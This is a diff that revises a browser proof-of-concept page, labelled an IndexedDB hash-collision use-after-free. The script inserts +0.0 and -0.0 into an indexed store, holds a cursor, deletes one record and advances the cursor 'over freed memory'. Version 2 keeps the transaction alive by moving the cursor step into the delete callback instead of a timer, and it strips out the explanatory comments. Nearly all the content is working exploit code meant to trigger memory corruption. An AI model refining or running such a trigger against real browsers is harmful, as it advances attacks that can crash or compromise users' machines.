@@ -11,14 +11,13 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== INDEXEDDB HASH COLLISION USE-AFTER-FREE ===", "info");
+log("=== INDEXEDDB HASH COLLISION USE-AFTER-FREE (V2) ===", "info");
 log("[*] Opening database and setting up the trap...", "info");
 
-let request = indexedDB.open("UAF_DB_" + Date.now(), 1);
+let request = indexedDB.open("UAF_DB_V2_" + Date.now(), 1);
 
 request.onupgradeneeded = (e) => {
     let db = e.target.result;
-    // We create an object store and an index to trigger the IDBKeyData hashing
     let store = db.createObjectStore("store", { keyPath: "id" });
     store.createIndex("idx", "value");
     log("[*] Database created with index 'idx'", "info");
@@ -31,10 +30,6 @@ request.onsuccess = (e) => {
     let tx = db.transaction("store", "readwrite");
     let store = tx.objectStore("store");
 
-    // Insert +0.0 and -0.0
-    // In C++, IDBKeyData operator== says they are EQUAL.
-    // But the Hasher generates DIFFERENT hashes.
-    // This completely breaks the HashMap invariants.
     log("[!] Inserting +0.0 and -0.0...", "warn");
     store.put({ id: 1, value: 0.0 });
     store.put({ id: 2, value: -0.0 });
@@ -46,7 +41,6 @@ request.onsuccess = (e) => {
         let store2 = tx2.objectStore("store");
         let index = store2.index("idx");
 
-        // Open a cursor on the index
         let cursorReq = index.openCursor();
         let firstCursor = true;
 
@@ -56,31 +50,24 @@ request.onsuccess = (e) => {
                 firstCursor = false;
                 log("[!] Cursor opened. Holding reference to the record...", "warn");
                 
-                // Now we delete +0.0. 
-                // Because of the broken HashMap, C++ might find the -0.0 entry 
-                // via operator== and delete THAT entry instead!
-                // But our cursor might still be pointing to it!
-                log("[!] Deleting +0.0 to corrupt the map and free the cursor's target...", "hit");
-                store2.delete(1); // Deletes id:1 which has value:0.0
+                log("[!] Deleting +0.0 to corrupt the map...", "hit");
+                // DO NOT USE SETTIMEOUT! Keep the transaction active!
+                let delReq = store2.delete(1); 
                 
-                // Wait a moment for the deletion to process, then advance the cursor
-                setTimeout(() => {
+                delReq.onsuccess = () => {
+                    log("[*] Delete processed! The map is corrupted!", "warn");
                     log("[*] Advancing cursor over FREED MEMORY...", "hit");
                     try {
                         cursor.continue();
                     } catch(e) {
                         log("[-] Error: " + e.message, "info");
                     }
-                }, 100);
+                };
             } else if (cursor) {
                 log("[-] Cursor advanced successfully (No crash? Maybe the allocator got lucky)", "info");
             }
         };
     };
-};
-
-request.onerror = (e) => {
-    log("[-] DB Error: " + e.target.error.message, "warn");
 };
 </script>
 </body>
